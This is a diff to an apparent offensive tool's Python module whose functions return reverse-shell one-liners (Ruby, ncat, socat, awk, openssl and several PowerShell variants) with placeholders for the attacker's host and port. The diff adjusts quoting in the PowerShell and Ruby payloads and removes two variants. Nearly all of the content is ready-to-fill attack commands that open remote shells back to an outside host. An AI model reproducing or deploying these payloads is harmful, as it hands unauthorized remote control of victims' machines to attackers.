@@ -16,7 +16,7 @@ def REV_PHP_TCP():
 
 
 def REV_RUBY_TCP():
-    return """ruby -rsocket -e "exit if fork;VAR1=TCPSocket.new('TARGET',PORT);while(VAR1.print 'shell>';VAR2=VAR1.gets);IO.popen(VAR2,'r'){|VAR3|VAR1.print VAR3.read}end" """
+    return """ruby -rsocket -e "exit if fork;VAR1=TCPSocket.new('TARGET',PORT);while(VAR1.print 'shell>';VAR2=VAR1.gets);IO.popen(VAR2,'r'){|io|VAR1.print io.read}end" """
 
 
 def REV_PERL_TCP():
@@ -36,7 +36,7 @@ def BASH_TCP():
 
 
 def REV_POWERSHELL_TCP():
-    return """powershell.exe -nop -ep bypass -Command "$VAR1='TARGET';$VAR2=PORT;$VAR3=New-Object System.Net.Sockets.TCPClient($VAR1,$VAR2);$VAR4=$VAR3.GetStream();[byte[]]$VAR5=0..65535|%{0};$VAR6=([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'> ');$VAR4.Write($VAR6,0,$VAR6.Length);while(($VAR7=$VAR4.Read($VAR5,0,$VAR5.Length)) -ne 0){$VAR8=([text.encoding]::ASCII).GetString($VAR5,0,$VAR7);try{$VAR9=(Invoke-Expression -c $VAR8 2>&1|Out-String)}catch{Write-Warning 'Something went wrong with execution of command on the target.';Write-Error $_;};$VAR10=$VAR9+'PS '+(Get-Location).Path+'> ';$VAR11=($VAR12[0]|Out-String);$VAR12.clear();$VAR10=$VAR10+$VAR11;$VAR6=([text.encoding]::ASCII).GetBytes($VAR10);$VAR4.Write($VAR6,0,$VAR6.Length);$VAR4.Flush();};$VAR3.Close();if($VAR13){$VAR13.Stop();};" """
+    return """powershell.exe -nop -ep bypass -Command '$VAR1=\\"TARGET\\";$VAR2=PORT;$VAR3=New-Object System.Net.Sockets.TCPClient($VAR1,$VAR2);$VAR4=$VAR3.GetStream();[byte[]]$VAR5=0..65535|%{0};$VAR6=([text.encoding]::ASCII).GetBytes(\\"PS \\"+(Get-Location).Path+\\"> \\");$VAR4.Write($VAR6,0,$VAR6.Length);while(($VAR7=$VAR4.Read($VAR5,0,$VAR5.Length)) -ne 0){$VAR8=([text.encoding]::ASCII).GetString($VAR5,0,$VAR7);try{$VAR9=(Invoke-Expression -c $VAR8 2>&1|Out-String)}catch{Write-Warning \\"Something went wrong with execution of command on the target.\\";Write-Error $_;};$VAR10=$VAR9+\\"PS \\"+(Get-Location).Path+\\"> \\";$VAR11=($VAR12[0]|Out-String);$VAR12.clear();$VAR10=$VAR10+$VAR11;$VAR6=([text.encoding]::ASCII).GetBytes($VAR10);$VAR4.Write($VAR6,0,$VAR6.Length);$VAR4.Flush();};$VAR3.Close();if($VAR13){$VAR13.Stop();};'"""
 
 
 def REVERSE_TCLSH():
@@ -45,10 +45,6 @@ def REVERSE_TCLSH():
 
 def REVERSE_NCAT():
     return "ncat TARGET PORT -e /bin/bash"
-
-
-def REVERSE_NCAT_SSL():
-    return "ncat TARGET PORT --ssl -e /bin/bash"
 
 
 def REVERSE_NC_TRADITIONAL_1():
@@ -79,10 +75,6 @@ def REVERSE_SOCAT():
     return """socat tcp-connect:TARGET:PORT exec:"bash -li",pty,stderr,setsid,sigint,sane"""
 
 
-def REVERSE_OPENSSL():
-    return "mkfifo /tmp/VAR1; /bin/sh -i < /tmp/VAR1 2>&1 | openssl s_client -quiet -connect TARGET:PORT > /tmp/VAR1; rm /tmp/VAR1"
-
-
 def REVERSE_AWK():
     return """VAR1=PORT;awk -v VAR2="$VAR1" 'BEGIN{VAR3="/inet/tcp/0/TARGET/"VAR2;while(NUM1){do{printf "shell>"|&VAR3;VAR3|& getline VAR4;if(VAR4){while((VAR4|& getline)>0)print $0|&VAR3;close(VAR4);}}while(VAR4!="exit")close(VAR3);break}}' /dev/null"""
 
@@ -108,7 +100,7 @@ def REVERSE_WINDOWS_BLOODSEEKER_TCP():
 
 
 def REVERSE_POWERSHELL_TINY_TCP():
-    return """powershell.exe -nop -ep bypass -Command "$VAR1=new-object system.net.sockets.tcpclient('TARGET',PORT);$VAR2=$VAR1.GetStream();[byte[]]$VAR3=0..65535|%{0};while(($VAR4=$VAR2.Read($VAR3,0,$VAR3.Length)) -ne 0){;$VAR5=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($VAR3,0,$VAR4);$VAR6=(iex $VAR5 2>&1|out-string);$VAR8=$VAR6+'PS '+(pwd).Path+'>';$VAR7=([text.encoding]::ASCII).GetBytes($VAR8);$VAR2.Write($VAR7,0,$VAR7.Length);$VAR2.Flush};$VAR1.close()" """
+    return """powershell.exe -nop -ep bypass -Command '$VAR1=new-object system.net.sockets.tcpclient(\\"TARGET\\",PORT);$VAR2=$VAR1.GetStream();[byte[]]$VAR3=0..65535|%{0};while(($VAR4=$VAR2.Read($VAR3,0,$VAR3.Length)) -ne 0){;$VAR5=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($VAR3,0,$VAR4);$VAR6=(iex $VAR5 2>&1|out-string);$VAR8=$VAR6+\\"PS \\"+(pwd).Path+\\">\\";$VAR7=([text.encoding]::ASCII).GetBytes($VAR8);$VAR2.Write($VAR7,0,$VAR7.Length);$VAR2.Flush};$VAR1.close()'"""
 
 
 def REVERSE_POWERSHELL_NISHANG_TCP():
